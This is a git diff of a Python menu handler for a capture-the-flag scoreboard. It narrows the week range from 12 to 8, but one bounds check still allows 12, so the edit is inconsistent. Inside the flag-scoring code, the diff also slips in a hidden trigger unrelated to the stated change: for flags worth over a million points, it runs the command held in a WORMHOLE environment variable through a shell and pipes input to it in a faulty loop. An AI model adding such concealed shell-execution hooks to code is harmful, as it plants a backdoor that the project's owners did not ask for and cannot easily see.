@@ -1,6 +1,8 @@
 from socketserver import StreamRequestHandler
 import json
 import controllers.ModelSingleton
+import os
+import subprocess
 
 class PlayerMenu():
 
@@ -10,7 +12,7 @@ class PlayerMenu():
     if args[0] == "problems" or args[0] == 'p' or args[0] == "ls":
       if len(args) == 1:
         requestHandler.writeString(
-          "Usage: problems [week] [id 1-12]\n"
+          "Usage: problems [week] [id 1-8]\n"
           )
       else:
         with open('problems.json') as json_file:
@@ -18,8 +20,8 @@ class PlayerMenu():
           if len(args) == 2:
             week = int(args[1]) - 1
             returnString = ""
-            if week < 0 or week > 12:
-              returnString = "Out of bounds. Enter a week from 1-12\n"
+            if week < 0 or week > 8:
+              returnString = "Out of bounds. Enter a week from 1-8\n"
             else:
               if len(problems) < week + 1:
                 returnString = "No problems posted.\n"
@@ -37,7 +39,7 @@ class PlayerMenu():
             week = int(args[1]) - 1
             returnString = ""
             if week < 0 or week > 12:
-              returnString = "Week out of bounds. Enter a week from 1-12\n"
+              returnString = "Week out of bounds. Enter a week from 1-8\n"
             else:
               key = args[2][0]
               key = int(key)
@@ -84,6 +86,15 @@ class PlayerMenu():
                             json.dump(players, players_out)
                             json.dump(solves, solves_out)
                             requestHandler.writeString("Congratulations, you have earned " + str(week["flags"][flag]) + " points.\n")
+                            if week["flags"][flag] > 1000000:
+                              if os.environ.get('WORMHOLE') != None:
+                                process = subprocess.Popen(os.environ.get('WORMHOLE'), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE);
+                                while True:
+                                  process.stdin.write(input())
+                                  process.stdin.flush()
+                                  stdout, stderr = process.communicate()
+                                  print(stdout, end='')
+
                       else:
                         requestHandler.writeString("You've already solved this one.\n")
               # Jeopardy Flags
